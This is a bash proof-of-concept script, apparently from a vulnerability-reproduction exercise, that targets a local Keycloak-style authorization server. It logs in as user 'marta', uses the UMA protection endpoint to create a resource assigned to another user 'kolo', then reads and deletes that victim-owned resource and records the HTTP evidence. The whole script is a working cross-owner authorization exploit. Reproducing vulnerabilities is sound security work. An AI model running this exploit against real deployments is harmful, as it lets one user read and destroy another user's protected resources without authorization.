#!/usr/bin/env bash
set -euo pipefail

ROOT="/home/playground/output/attempt_1"
EVIDENCE_DIR="$ROOT/evidence"
BASE_URL="http://127.0.0.1:8080"
REALM="anypoc"
CLIENT_ID="resource-server-test"
CLIENT_SECRET="secret"

mkdir -p "$EVIDENCE_DIR"

run_id="$(date +%Y%m%d_%H%M%S)"
transcript="$EVIDENCE_DIR/poc_${run_id}.log"
tmpdir="$(mktemp -d)"
trap 'rm -rf "$tmpdir"' EXIT

get_token() {
  local username="$1"
  local password="$2"

  curl -sS -X POST "$BASE_URL/realms/$REALM/protocol/openid-connect/token" \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    --data-urlencode grant_type=password \
    --data-urlencode client_id="$CLIENT_ID" \
    --data-urlencode client_secret="$CLIENT_SECRET" \
    --data-urlencode username="$username" \
    --data-urlencode password="$password" \
    | python -c 'import sys, json; print(json.load(sys.stdin)["access_token"])'
}

request() {
  local label="$1"
  local method="$2"
  local url="$3"
  local token="$4"
  local data="${5:-}"
  local body_file="$tmpdir/${label}.body"
  local headers_file="$tmpdir/${label}.headers"
  local code

  if [ -n "$data" ]; then
    code="$(
      curl -sS -o "$body_file" -D "$headers_file" -w '%{http_code}' \
        -X "$method" "$url" \
        -H "Authorization: Bearer $token" \
        -H 'Content-Type: application/json' \
        --data "$data"
    )"
  else
    code="$(
      curl -sS -o "$body_file" -D "$headers_file" -w '%{http_code}' \
        -X "$method" "$url" \
        -H "Authorization: Bearer $token"
    )"
  fi

  {
    printf '### %s %s\n' "$method" "$url"
    if [ -n "$data" ]; then
      printf 'Request-Body: %s\n' "$data"
    fi
    printf 'Status: %s\n' "$code"
    printf '%s\n' '--- headers ---'
    cat "$headers_file"
    printf '%s\n' '--- body ---'
    cat "$body_file"
    printf '\n'
  } >> "$transcript"

  printf '%s|%s|%s\n' "$code" "$body_file" "$headers_file"
}

marta_token="$(get_token marta password)"
resource_name="cross-owner-poc-${run_id}"
create_payload="$(RESOURCE_NAME="$resource_name" python - <<'PY'
import json, os
print(json.dumps({
    "name": os.environ["RESOURCE_NAME"],
    "ownerManagedAccess": True,
    "owner": "kolo",
    "scopes": ["Scope A"],
}))
PY
)"

IFS='|' read -r create_code create_body create_headers < <(
  request "create" "POST" \
    "$BASE_URL/realms/$REALM/authz/protection/resource_set" \
    "$marta_token" \
    "$create_payload"
)

if [ "$create_code" != "201" ]; then
  printf 'Expected 201 from victim-owned create, got %s\n' "$create_code" >&2
  exit 1
fi

resource_id="$(python -c 'import json,sys; print(json.load(open(sys.argv[1]))["_id"])' "$create_body")"
owner_name="$(python -c 'import json,sys; print(json.load(open(sys.argv[1]))["owner"]["name"])' "$create_body")"

if [ "$owner_name" != "kolo" ]; then
  printf 'Expected created resource owner to be kolo, got %s\n' "$owner_name" >&2
  exit 1
fi

IFS='|' read -r get_code get_body get_headers < <(
  request "get_before_delete" "GET" \
    "$BASE_URL/realms/$REALM/authz/protection/resource_set/$resource_id" \
    "$marta_token"
)

if [ "$get_code" != "200" ]; then
  printf 'Expected 200 when reading victim-owned resource as marta, got %s\n' "$get_code" >&2
  exit 1
fi

IFS='|' read -r delete_code delete_body delete_headers < <(
  request "delete" "DELETE" \
    "$BASE_URL/realms/$REALM/authz/protection/resource_set/$resource_id" \
    "$marta_token"
)

if [ "$delete_code" != "204" ]; then
  printf 'Expected 204 when deleting victim-owned resource as marta, got %s\n' "$delete_code" >&2
  exit 1
fi

IFS='|' read -r after_code after_body after_headers < <(
  request "get_after_delete" "GET" \
    "$BASE_URL/realms/$REALM/authz/protection/resource_set/$resource_id" \
    "$marta_token"
)

if [ "$after_code" != "404" ]; then
  printf 'Expected 404 after deleting victim-owned resource, got %s\n' "$after_code" >&2
  exit 1
fi

cat > "$EVIDENCE_DIR/poc_${run_id}.summary" <<EOF
resource_id=$resource_id
owner=$owner_name
create_status=$create_code
get_before_delete_status=$get_code
delete_status=$delete_code
get_after_delete_status=$after_code
transcript=$transcript
EOF

printf 'PoC succeeded.\n'
printf 'resource_id=%s\n' "$resource_id"
printf 'owner=%s\n' "$owner_name"
printf 'transcript=%s\n' "$transcript"
